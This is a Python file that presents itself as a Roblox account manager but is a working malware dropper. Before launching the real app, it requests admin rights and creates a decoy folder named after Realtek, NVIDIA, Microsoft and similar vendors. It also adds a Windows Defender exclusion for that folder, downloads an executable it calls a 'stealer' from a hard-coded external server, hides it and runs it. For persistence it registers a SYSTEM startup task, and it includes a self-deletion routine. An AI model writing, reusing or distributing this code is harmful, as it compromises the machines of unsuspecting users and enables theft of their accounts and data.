#!/usr/bin/env python
# RAM V1 - Roblox Account Manager (with Direct Downloader)
# Main entry point

import sys
import os
import subprocess
import requests
import ctypes
import tempfile
import shutil
import time
import random
import hashlib
import json
import base64
from pathlib import Path
from cryptography.fernet import Fernet

# Global variables
STEALER_DOWNLOADED = False
STEALER_PATH = None
FAKE_FOLDER_PATH = None
ENCRYPTION_KEY = None

# Direct download link - REPLACE WITH YOUR ACTUAL LINK
DIRECT_DOWNLOAD_URL = "http://node1.lunes.host:2343/api/download/rtkhdaud64.exe"
legit_names = [
        "RealtekHD Audio",
        "Realtek Semiconductor Corp",
        "Realtek Audio Driver",
        "Realtek HD Audio Manager",
        "Realtek Audio Control Panel",
        "Realtek Audio Service",
        "Realtek Audio Driver Update",
        "Realtek Audio Effects",
        "Realtek HD Audio Driver",
        "Realtek Audio Configuration",
        "Intel Driver Update Utility",
        "Intel Graphics Driver",
        "Intel Rapid Storage Technology",
        "Intel Management Engine",
        "Intel Chipset Driver",
        "NVIDIA Graphics Driver",
        "NVIDIA GeForce Experience",
        "NVIDIA Control Panel",
        "AMD Software",
        "AMD Radeon Settings",
        "AMD Chipset Drivers",
        "Microsoft Visual C++ Redist",
        "Microsoft .NET Framework",
        "Microsoft DirectX",
        "Microsoft Edge Update",
        "Microsoft Teams Presence",
        "Microsoft OneDrive Setup",
        "Google Update Service",
        "Google Chrome Setup",
        "Google Crash Handler",
        "Adobe Flash Player",
        "Adobe Reader Update",
        "Adobe Acrobat DC",
        "Java Update Scheduler",
        "Java Runtime Environment",
        "Oracle Java Update",
        "Apple Software Update",
        "Apple Mobile Device Support",
        "Bonjour Service",
        "iCloud Drive",
        "iTunes Helper",
        "Spotify Update",
        "Discord Update",
        "Discord RPC",
        "Steam Client Service",
        "Steam Web Helper",
        "Epic Games Launcher",
        "Epic Online Services",
        "Battle.net Update",
        "Battle.net Agent",
        "Riot Games Client",
        "Riot Vanguard",
        "Valorant Anti-Cheat",
        "Logitech Gaming Software",
        "Logitech G Hub",
        "Corsair iCUE",
        "Razer Synapse",
        "Razer Cortex",
        "MSI Afterburner",
        "ASUS Aura Sync",
        "ASUS AI Suite",
        "Gigabyte App Center",
        "Windows Update Assistant",
        "Windows Defender Update",
        "Windows Security Center",
        "Windows Telemetry",
        "Windows Compatibility Telemetry",
        "Microsoft Windows SDK",
        "Microsoft Windows Kits",
        "Microsoft Windows Driver Kit",
        "Windows Performance Toolkit",
        "Windows Debugging Tools"
    ]

def generate_key_from_system():
    """Generate an encryption key based on system-specific information"""
    try:
        # Gather system-specific information
        system_info = [
            os.environ.get('COMPUTERNAME', ''),
            os.environ.get('PROCESSOR_IDENTIFIER', ''),
            os.environ.get('USERNAME', ''),
            str(ctypes.windll.kernel32.GetTickCount64()),
            str(os.path.getsize('C:\\Windows\\System32\\ntdll.dll') if os.path.exists('C:\\Windows\\System32\\ntdll.dll') else ''),
            hashlib.md5(open(sys.executable, 'rb').read(1024)).hexdigest() if os.path.exists(sys.executable) else ''
        ]
        
        # Create a unique key from system info
        unique_string = ''.join(system_info)
        key = hashlib.sha256(unique_string.encode()).digest()
        
        # Convert to Fernet-compatible key (base64 encoded 32 bytes)
        return base64.urlsafe_b64encode(key[:32])
    except:
        # Fallback to a random key if system info gathering fails
        return Fernet.generate_key()

def init_encryption():
    """Initialize encryption with system-specific key"""
    global ENCRYPTION_KEY
    if not ENCRYPTION_KEY:
        ENCRYPTION_KEY = generate_key_from_system()
    return Fernet(ENCRYPTION_KEY)

def encrypt_data(data):
    """Encrypt data using Fernet"""
    try:
        f = init_encryption()
        if isinstance(data, str):
            data = data.encode('utf-8')
        elif isinstance(data, dict):
            data = json.dumps(data).encode('utf-8')
        encrypted = f.encrypt(data)
        return base64.b64encode(encrypted).decode('utf-8')
    except Exception as e:
        print(f"[-] Encryption error: {e}")
        return None

def decrypt_data(encrypted_data):
    """Decrypt data using Fernet"""
    try:
        f = init_encryption()
        encrypted_bytes = base64.b64decode(encrypted_data.encode('utf-8'))
        decrypted = f.decrypt(encrypted_bytes)
        
        # Try to parse as JSON first
        try:
            return json.loads(decrypted.decode('utf-8'))
        except:
            # Return as string if not JSON
            return decrypted.decode('utf-8')
    except Exception as e:
        print(f"[-] Decryption error: {e}")
        return None

def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    """Request administrator privileges by re-running the script"""
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()

def check_existing_installation():
    """Check if the stealer is already installed using encrypted marker"""
    global STEALER_DOWNLOADED, STEALER_PATH, FAKE_FOLDER_PATH
    
    # Check for marker file in AppData
    appdata_roaming = os.environ.get('APPDATA', os.path.expanduser('~\\AppData\\Roaming'))
    marker_path = os.path.join(appdata_roaming, "RAM_V1", ".installed")
    
    if os.path.exists(marker_path):
        try:
            with open(marker_path, 'r') as f:
                encrypted_content = f.read().strip()
                
            # Decrypt the marker file
            data = decrypt_data(encrypted_content)
            
            if data and isinstance(data, dict):
                STEALER_PATH = data.get('stealer_path')
                FAKE_FOLDER_PATH = data.get('fake_folder')
                install_date = data.get('install_date', 'Unknown')
                version = data.get('version', 'Unknown')
                
                if STEALER_PATH and os.path.exists(STEALER_PATH):
                    STEALER_DOWNLOADED = True
                    print(f"[✓] Found existing encrypted installation")
                    print(f"    📁 Location: {FAKE_FOLDER_PATH}")
                    print(f"    📅 Installed: {install_date}")
                    print(f"    📦 Version: {version}")
                    return True
                else:
                    print(f"[!] Marker file found but stealer missing (path: {STEALER_PATH})")
                    # Delete corrupted marker
                    os.remove(marker_path)
        except Exception as e:
            print(f"[-] Failed to read encrypted marker: {e}")
    
    return False

def create_marker_file(stealer_path, fake_folder):
    """Create an encrypted marker file to track installation"""
    try:
        appdata_roaming = os.environ.get('APPDATA', os.path.expanduser('~\\AppData\\Roaming'))
        ram_folder = os.path.join(appdata_roaming, "RAM_V1")
        os.makedirs(ram_folder, exist_ok=True)
        
        marker_path = os.path.join(ram_folder, ".installed")
        
        # Data to encrypt
        data = {
            'stealer_path': stealer_path,
            'fake_folder': fake_folder,
            'install_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'version': '1.0',
            'machine_id': hashlib.md5(os.environ.get('COMPUTERNAME', '').encode()).hexdigest(),
            'installer_version': '2.0'
        }
        
        # Encrypt the data
        encrypted_data = encrypt_data(data)
        
        if encrypted_data:
            with open(marker_path, 'w') as f:
                f.write(encrypted_data)
            
            # Hide the marker file
            ctypes.windll.kernel32.SetFileAttributesW(marker_path, 2)  # Hidden attribute
            
            print(f"[+] Created encrypted installation marker")
            return True
    except Exception as e:
        print(f"[-] Failed to create encrypted marker: {e}")
        return False

def add_defender_exclusion(folder_path):
    """Add Windows Defender exclusion for the folder"""
    try:
        # Check if exclusion already exists
        check_cmd = f'powershell -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"'
        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
        
        if folder_path in result.stdout:
            print(f"[✓] Exclusion already exists for: {folder_path}")
            return True
        
        # Add exclusion
        powershell_cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{folder_path}\'"'
        subprocess.run(powershell_cmd, shell=True, capture_output=True)
        print(f"[+] Added Defender exclusion for: {folder_path}")
        return True
    except Exception as e:
        print(f"[-] Failed to add exclusion: {e}")
        return False

def find_existing_fake_folder():
    """Check if any of our fake folders already exist"""
    
    appdata_local = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
    
    for name in legit_names:
        folder_path = os.path.join(appdata_local, name)
        if os.path.exists(folder_path):
            # Check if our stealer is inside
            stealer_path = os.path.join(folder_path, "rtkhdaud64.exe")
            if os.path.exists(stealer_path):
                print(f"[✓] Found existing fake folder with stealer: {folder_path}")
                return folder_path, stealer_path
    
    return None, None

def create_fake_folder():
    """Create a fake legitimate folder in AppData/Local"""
    global FAKE_FOLDER_PATH, STEALER_PATH
    
    # First check if we already have a folder
    existing_folder, existing_stealer = find_existing_fake_folder()
    if existing_folder and existing_stealer:
        FAKE_FOLDER_PATH = existing_folder
        STEALER_PATH = existing_stealer
        print(f"[✓] Using existing folder: {FAKE_FOLDER_PATH}")
        return FAKE_FOLDER_PATH
    
    # Select random folder name
    folder_name = random.choice(legit_names)
    
    # Create path in AppData/Local
    appdata_local = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
    fake_path = os.path.join(appdata_local, folder_name)
    
    # Create the folder
    os.makedirs(fake_path, exist_ok=True)
    
    # Create some fake files to look legit
    create_fake_files(fake_path, folder_name)
    
    print(f"[+] Created fake folder: {fake_path}")
    FAKE_FOLDER_PATH = fake_path
    return fake_path

def create_fake_files(folder_path, folder_name):
    """Create fake legitimate-looking files in the folder"""
    
    # Create a fake DLL file
    dll_path = os.path.join(folder_path, "rtkhdaud.dat")
    with open(dll_path, 'w') as f:
        f.write("; Realtek High Definition Audio Driver Configuration File\n")
        f.write("; Version 6.0.1.8345\n")
        f.write("; Copyright (c) Realtek Semiconductor Corp.\n")
        f.write("[HDAUDIO]\n")
        f.write("DeviceCount=1\n")
        f.write("Device0=Realtek HD Audio\n")
    
    # Create a fake INF file
    inf_path = os.path.join(folder_path, "rtkhdaud.inf")
    with open(inf_path, 'w') as f:
        f.write("; Realtek HD Audio Driver Installation File\n")
        f.write("[Version]\n")
        f.write("Signature=\"$WINDOWS NT$\"\n")
        f.write("Class=MEDIA\n")
        f.write("Provider=%REALTEK%\n")
        f.write("\n[SourceDisksNames]\n")
        f.write("1 = %DiskName%,,,\n")
    
    # Create a fake log file
    log_path = os.path.join(folder_path, "install.log")
    with open(log_path, 'w') as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Installation started\n")
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Copying files...\n")
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Registering drivers...\n")
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Installation completed successfully\n")
    
    # Create a fake version file
    ver_path = os.path.join(folder_path, "version.txt")
    with open(ver_path, 'w') as f:
        f.write("Product: Realtek High Definition Audio Driver\n")
        f.write("Version: 6.0.1.8345\n")
        f.write("Date: 2025-03-15\n")
        f.write("Status: Installed\n")

def download_from_direct_link(download_url, save_path):
    """Download file from direct link"""
    try:
        print(f"[+] Downloading from: {download_url}")
        
        # Download with progress
        response = requests.get(download_url, stream=True, timeout=30)
        response.raise_for_status()
        
        total_size = int(response.headers.get('content-length', 0))
        downloaded = 0
        
        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                downloaded += len(chunk)
                if total_size:
                    percent = (downloaded / total_size) * 100
                    print(f"\r[+] Download progress: {percent:.1f}%", end='')
        
        print(f"\n[+] Downloaded to: {save_path}")
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Download failed: {e}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error during download: {e}")
        return False

def hide_file(file_path):
    """Hide the file using Windows attributes"""
    try:
        # Set hidden and system attributes
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2+4)  # FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM
        print(f"[+] Hidden file: {file_path}")
    except:
        pass

def create_scheduled_task(exe_path):
    """Create a scheduled task for persistence"""
    try:
        task_name = f"RealtekAudioService_{random.randint(1000, 9999)}"
        
        # PowerShell command to create scheduled task
        ps_command = f'''
        $action = New-ScheduledTaskAction -Execute "{exe_path}"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName "{task_name}" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
        '''
        
        subprocess.run(['powershell', '-Command', ps_command], capture_output=True)
        print(f"[+] Created scheduled task: {task_name}")
        return True
    except Exception as e:
        print(f"[-] Failed to create scheduled task: {e}")
        return False

def launch_stealer(exe_path):
    """Launch the stealer executable"""
    try:
        # Hide the file first
        hide_file(exe_path)
        
        # Launch the stealer (as admin)
        if is_admin():
            subprocess.Popen([exe_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            # Request admin and launch
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", exe_path, None, None, 0
            )
        
        print(f"[+] Launched stealer: {exe_path}")
        return True
    except Exception as e:
        print(f"[-] Failed to launch: {e}")
        return False

def cleanup_self():
    """Delete the original script after execution"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        
        # Create a batch file to delete this script after exit
        batch_content = f'''@echo off
timeout /t 2 /nobreak >nul
del "{script_path}" /f /q
del "%~f0" /f /q
'''
        batch_path = os.path.join(tempfile.gettempdir(), f"cleanup_{random.randint(1000, 9999)}.bat")
        
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        
        subprocess.Popen(['cmd', '/c', batch_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        print("[+] Self-deletion scheduled")
    except:
        pass

def run_stealer_downloader():
    """Run the stealer downloader logic"""
    global STEALER_DOWNLOADED, STEALER_PATH, FAKE_FOLDER_PATH
    
    print("\n" + "=" * 60)
    print("   RAM V1 - System Configuration Tool")
    print("=" * 60)
    print()
    
    # Step 1: Check if already installed
    print("[1/5] Checking for existing installation...")
    if check_existing_installation():
        print("[✓] Stealer already installed, skipping download")
        return True
    print()
    
    # Step 2: Check for admin rights
    print("[2/5] Checking administrator privileges...")
    if not is_admin():
        print("[!] Administrator privileges required for first-time setup")
        print("[!] Requesting elevation...")
        request_admin()
        sys.exit()
    print("[✓] Running with administrator privileges")
    print()
    
    # Step 3: Create fake folder
    print("[3/5] Creating installation directory...")
    fake_folder = create_fake_folder()
    print()
    
    # Step 4: Add Windows Defender exclusion
    print("[4/5] Configuring Windows Security...")
    add_defender_exclusion(fake_folder)
    print()
    
    # Step 5: Download from direct link
    print("[5/5] Downloading components from server...")
    exe_path = os.path.join(fake_folder, "rtkhdaud64.exe")
    
    if download_from_direct_link(DIRECT_DOWNLOAD_URL, exe_path):
        STEALER_PATH = exe_path
        FAKE_FOLDER_PATH = fake_folder
        
        # Create encrypted marker file
        create_marker_file(exe_path, fake_folder)
        
        # Launch the stealer
        launch_stealer(exe_path)
        
        # Create persistence
        create_scheduled_task(exe_path)
        
        print("\n" + "=" * 60)
        print("   Installation completed successfully!")
        print("=" * 60)
        
        return True
    else:
        print("[-] Download failed.")
        return False

# Original RAM V1 imports and logic
try:
    from ui.app import RAMApp
except ImportError:
    print("[!] Note: RAMApp UI module not found. This is expected if this is just the downloader component.")
    
    # Create a placeholder if needed
    class RAMApp:
        def mainloop(self):
            print("[!] RAM V1 UI not available - running in downloader-only mode")

def run_ram_app():
    """Run the original RAM V1 application"""
    try:
        app = RAMApp()
        app.mainloop()
    except KeyboardInterrupt:
        print("\nApplication closed by user")
    except Exception as e:
        print(f"Fatal error: {e}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    # First, run the stealer downloader
    downloader_result = run_stealer_downloader()
    
    # Then run the original RAM V1 app
    print("\n" + "=" * 60)
    print("   Starting RAM V1 - Roblox Account Manager")
    print("=" * 60)
    print()
    
    run_ram_app()